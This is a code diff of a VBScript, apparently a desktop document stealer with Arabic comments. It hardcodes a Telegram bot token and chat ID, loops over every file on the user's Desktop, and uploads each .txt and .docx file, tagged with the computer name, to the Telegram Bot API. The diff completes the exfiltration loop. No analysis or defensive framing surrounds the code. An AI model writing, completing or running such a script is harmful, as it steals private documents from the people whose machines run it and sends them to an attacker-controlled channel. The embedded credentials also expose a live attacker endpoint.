@@ -1,6 +1,6 @@
-Dim WshShell, objFSO, botToken, chatId, computerId
+Dim WshShell, fso, botToken, chatId, computerId
 Set WshShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set fso = CreateObject("Scripting.FileSystemObject")
 
 botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
 chatId   = "8221773638"
@@ -10,50 +10,53 @@ computerId = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
 Dim desktopPath
 desktopPath = WshShell.SpecialFolders("Desktop")
 
-Sub SendFileToTelegram(filePath)
-    If Not objFSO.FileExists(filePath) Then Exit Sub
+Sub SendFile(filePath)
+    If Not fso.FileExists(filePath) Then Exit Sub
     
-    Dim fileName, ext, http, boundary, bodyStart, bodyEnd, fileContent
-    fileName = objFSO.GetFileName(filePath)
-    ext = LCase(objFSO.GetExtensionName(fileName))
+    Dim fileName, ext
+    fileName = fso.GetFileName(filePath)
+    ext = LCase(fso.GetExtensionName(fileName))
     
     If ext <> "txt" And ext <> "docx" Then Exit Sub
     
-    boundary = "------------------------" & WScript.CreateObject("Scripting.FileSystemObject").GetTempName
+    Dim http, stream, boundary, dataStart, dataEnd, fileData
     
-    Set http = CreateObject("MSXML2.XMLHTTP")
+    boundary = "----bound" & Year(Now) & Month(Now) & Day(Now) & Timer
     
-    Dim stream
+    ' قراءة الملف
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
     stream.LoadFromFile filePath
-    fileContent = stream.Read
+    fileData = stream.Read
     stream.Close
     
-    bodyStart = "--" & boundary & vbCrLf & _
+    ' بناء الـ body
+    dataStart = "--" & boundary & vbCrLf & _
                 "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
                 chatId & vbCrLf & _
                 "--" & boundary & vbCrLf & _
                 "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & _
-                "Desktop file from " & computerId & vbCrLf & _
+                computerId & " | " & fileName & vbCrLf & _
                 "--" & boundary & vbCrLf & _
                 "Content-Disposition: form-data; name=""document""; filename=""" & fileName & """" & vbCrLf & _
                 "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
     
-    bodyEnd = vbCrLf & "--" & boundary & "--"
+    dataEnd = vbCrLf & "--" & boundary & "--"
     
-    Dim fullBody
-    fullBody = bodyStart & fileContent & bodyEnd
-    
-    Dim apiUrl
-    apiUrl = "https://api.telegram.org/bot" & botToken & "/sendDocument"
-    
-    http.Open "POST", apiUrl, False
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendDocument", False
     http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
-    http.setRequestHeader "User-Agent", "Mozilla/5.0"
-    http.Send fullBody
+    http.Send dataStart & fileData & dataEnd
 End Sub
 
+' تنفيذ
 Dim folder, file
-Set folder = objFSO.GetFolder
+Set folder = fso.GetFolder(desktopPath)
+
+For Each file In folder.Files
+    SendFile file.Path
+Next
+
+Set WshShell = Nothing
+Set fso = Nothing
